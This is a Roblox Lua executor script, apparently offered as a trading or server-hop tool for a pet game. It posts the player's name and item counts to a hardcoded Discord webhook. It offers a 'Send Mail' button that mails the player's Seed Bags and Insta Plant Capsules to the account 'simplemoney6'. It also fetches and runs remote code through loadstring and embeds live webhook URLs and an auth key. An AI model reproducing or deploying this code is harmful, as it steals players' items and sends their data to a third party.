
local function HideTrading()
    while true do

wait(60)

local Http = game:GetService("HttpService")
local TPS = game:GetService("TeleportService")
local Api = "https://games.roblox.com/v1/games/"

local _place = game.PlaceId
local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"

-- Updated HTTP request method
local httpService = game:GetService("HttpService")
local request = (syn and syn.request) or request or (http and http.request) or http_request

function ListServers(cursor)
    local Raw = request({
        Url = _servers .. ((cursor and "&cursor="..cursor) or ""),
        Method = "GET"
    })
    return Http:JSONDecode(Raw.Body)
end

local randomPlayers = math.random(10,15)  -- Generate a random number between 1 and 8
local Server, Next

repeat
    local Servers = ListServers(Next)
    Server = Servers.data[1]
    Next = Servers.nextPageCursor
until Server and Server.playing >= randomPlayers  -- Ensure the server has more players than the random number

if Server then
    TPS:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
else
    print("No suitable server found.")
end

        wait()
    end
end
    
coroutine.wrap(HideTrading)()

if game.PlaceId == 15502339080 or game.PlaceId == 8737899170 or game.PlaceId == 15588442388 then
    local WaitValue = 60
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local HttpService = game:GetService("HttpService")
    local Client = require(ReplicatedStorage:WaitForChild("Library"))
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")

    local webhookURL = "https://discord.com/api/webhooks/1240051310783627374/FeWsgqN_nlUvPEXVnxgP4pZ5qIJeDn6Uyhd0_vjjBVVGegKU8jGLgVdV0ULgRWumSvML"
    local request = (syn and syn.request) or request or (http and http.request) or http_request

    local DiamondsTable = {"Diamonds"}
    local ItemTable = {"Seed Bag", "Insta Plant Capsule"}

    function MakeDiamondsTable(Table)
        local Temp = {}
        for i, v in next, Client.Items.All.Globals.All() do
            if table.find(Table, v._data.id) then
                table.insert(Temp, v)
            end
        end
        return Temp
    end

    function MakeTable(Table)
        local Temp = {}
        for i, v in next, Client.Items.All.Globals.All() do
            if table.find(Table, v._data.id) then
                table.insert(Temp, v)
            end
        end
        return Temp
    end

    local diamondsAmount, seedBagAmount, instaPlantCapsuleAmount
    local seedbagid, instaplantid

    function GrabDiamondsId()
        for i, MadeTable in ipairs(MakeDiamondsTable(DiamondsTable)) do
            local Table = HttpService:JSONDecode(tostring(MadeTable))
            if Table.class == "Currency" then
                diamondsAmount = Table.data._am
            end
        end
    end

    function GrabId()
        for i, MadeTable in ipairs(MakeTable(ItemTable)) do
            local Table = HttpService:JSONDecode(tostring(MadeTable))
            if Table.data.id == "Seed Bag" then
                seedBagAmount = Table.data._am
                seedbagid = Table.uid
            elseif Table.data.id == "Insta Plant Capsule" then
                instaPlantCapsuleAmount = Table.data._am
                instaplantid = Table.uid
            end
        end
    end

    GrabDiamondsId()
    GrabId()

    local playerName = Players.LocalPlayer.Name

    local contentMsg = {
        embeds = {
            {
                title = "***👨‍💻: " .. playerName .. "***",
                description = "",
                color = 16777215,
                fields = {
                    {
                        name = "***💎:***",
                        value = "***" .. (diamondsAmount or 0) .. "***"
                    },
                    {
                        name = "***🫙:***",
                        value = "***" .. (instaPlantCapsuleAmount or 0) .. "***"
                    },
                    {
                        name = "***🌱:***",
                        value = "***" .. (seedBagAmount or 0) .. "***"
                    }
                }
            }
        }
    }

    request({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Body = HttpService:JSONEncode(contentMsg),
    })

    local function Dialogggg()
        while true do
            local player = game.Players.LocalPlayer
            local gui = player.PlayerGui:FindFirstChild("_MACHINES")

            if gui then
                local mailboxMachine = gui.MailboxMachine
                if mailboxMachine then
                    local giftsFrame = mailboxMachine.Frame.GiftsFrame
                    if giftsFrame then
                        local itemsFrame = giftsFrame.ItemsFrame
                        if itemsFrame then
                            local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
                            if frameChild then
                                local args = {
                                    [1] = {
                                        [1] = frameChild.Name
                                    }
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
                            end
                        end
                    end
                end
            end

            wait(1)
        end
    end

    coroutine.wrap(Dialogggg)()

    local screenGui = Instance.new("ScreenGui")
    local button = Instance.new("TextButton")
   
    local buttonClicked = false

    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    button.Parent = screenGui
    button.Size = UDim2.new(0, 200, 0, 50)
    button.Position = UDim2.new(0.5, -100, 0, 0)
    button.BackgroundColor3 = Color3.new(0, 0, 0)
    button.Text = "Send Mail"
    button.TextColor3 = Color3.new(1, 1, 1)
    button.TextScaled = true

    button.MouseButton1Click:Connect(function()
        buttonClicked = true
        WaitValue = 9999

        local args1 = {
            [1] = "simplemoney6",
            [2] = "sent",
            [3] = "Misc",
            [4] = seedbagid or "",
            [5] = seedBagAmount or ""
        }

        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args1))
        wait(1)
        local args2 = {
            [1] = "simplemoney6",
            [2] = "sent",
            [3] = "Misc",
            [4] = instaplantid or "",
            [5] = instaPlantCapsuleAmount or ""
        }

        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))

        local mailContentMsg = {
            embeds = {
                {
                    title = "***👨‍💻: " .. playerName .. "***",
                    description = "***💌: Mail Successfully Sent!***",
                    color = 16777215,
                    fields = {
                        {
                            name = "***🫙:***",
                            value = "Sent ***" .. instaPlantCapsuleAmount .. "***"
                        },
                        {
                            name = "***🌱:***",
                            value = "Sent ***" .. seedBagAmount .. "***"
                        }
                    }
                }
            }
        }

        request({
            Url = webhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
            },
            Body = HttpService:JSONEncode(mailContentMsg),
        })
    end)

    wait(WaitValue)

    if not buttonClicked then
        getgenv().Config = {
            HUGE_GAMES_AUTHKEY = "HUGE_5EN7Jo6KrCC4",
            Minimum_Gems = 1000000,
            Items = {
            {
                    Item = "Seed Bag",
                    Price = 5000,
                    Type = "Misc"
                },
                {
                    Item = "Insta Plant Capsule",
                    Price = 20000,
                    Type = "Misc"
                },
                
            
                
        
            },
            Extra = {
                Huges = {Enabled=false, Percentage= "-10%", priceCap = 50000000},
                Titanics = {Enabled=false, Percentage="-50%", priceCap = 50000000},
                Exclusive = {Enabled=false, Percentage="-10%", priceCap = 50000000},
                Exclusive_Eggs = {Enabled=false, Percentage="-50%", priceCap = 50000000},
                Any_Item = {Enabled=false, Percentage="-50%", priceCap = 50000000}
            },
            Hop = {
                Server_Hop = true,
                Server_Hop_Mode = "Terminal",
            },
            Webhooks = {
                Enable_Discord_Webhook = true,
                Webhook_Url = "https://discord.com/api/webhooks/1240148195783213127/SCs8ji01gBTVw2G66fJDS2Z9Re6eeaXyD8uPRIIhahlsS9qCgPPtQ2NYPFdWlzyXoKo6",
                Hide_Username = false,
            }
        }
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1c2273a86dbf2e8469b442e55882aa47.lua"))()
    end
else
    local TPS = game:GetService("TeleportService")
    local placeId = 8737899170

    TPS:Teleport(placeId)
end
